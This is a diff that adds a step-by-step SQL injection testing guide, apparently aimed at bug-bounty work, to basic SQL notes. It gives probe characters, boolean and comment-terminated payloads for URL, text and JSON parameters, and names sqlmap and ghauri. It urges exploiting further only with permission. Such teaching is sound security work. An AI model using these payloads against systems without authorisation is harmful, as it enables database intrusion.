@@ -3,6 +3,80 @@
      SQL stands for Structured Query Language
     SQL lets you access and manipulate databases
     SQL became a standard of the American National Standards Institute (ANSI) in 1986, and of the International Organization for Standardization (ISO) in 1987
+    
+How to test for SQL injection 👇
+
+1) Select params for testing in:
+
+🔹 URL query
+🔹 POST body
+🔹 Headers
+🔹 Cookies
+
+It can be any parameter. Typically, I test integer parameters first.
+
+2) Perform math if the tested field is an integer:
+
+🔹 user_id=1338-1
+
+If there is a sign of an SQL injection, you will see a result with user_id=1337.
+
+3) Try to add symbols at the end of the parameter:
+
+🔹 ' (single quote)
+🔹 " (double quote)
+🔹 ; (semicolon)
+
+Observe the response status. If you spot an error response, there might be a chance of SQL injection.
+
+4) Try to add another symbol and see if the error disappears
+
+🔹 login=admin (status: 200)
+🔹 login=admin' (status: 500)
+🔹 login=admin'' (status: 200)
+
+In SQL the escape character for a single quote is another single quote, and for a double quote is another double quote
+
+5) Perform SQL query functions
+
+Int
+🔹 user_id=1337 AND 1=1 (status: 200)
+🔹 user_id=1337 AND 2=1 (status: 500)
+
+Text
+🔹 login=admin' AND 'A'='A (status: 200)
+🔹 login=admin' AND 'A'='B (status: 500)
+
+JSON int
+🔹 {"user_id":"1337 AND 1=1"} (status: 200)
+
+6) Combine SQL query functions with comments
+
+Int
+🔹 user_id=1337 AND 1=1 -- (status: 200)
+
+Text
+🔹 login=admin' AND 'A'='A' -- (status: 200)
+
+JSON int
+🔹 {"user_id":"1337 AND 1=1 --"} (status: 200)
+
+JSON text
+🔹 {"login":"admin' AND 'A'='A' --"} (status: 200)
+
+7) Use Tools to test vulnerable params further
+
+🔹 sqlmap
+🔹 r0oth3x49/ghauri (github)
+
+Remember that you only need to obtain the database version for the initial Proof of Concept (POC). Further exploitation should be tested only with permission from the program/company
+
+8) You can use the following DB Fiddle to experiment with SQL injection points and behavior.
+
+Edit SQL queries on the right and then click RUN to see how the SQL queries are executed and what results are displayed at the bottom.
+
+https://lnkd.in/d9j6sawD    
+    
  
 # Overview 
 
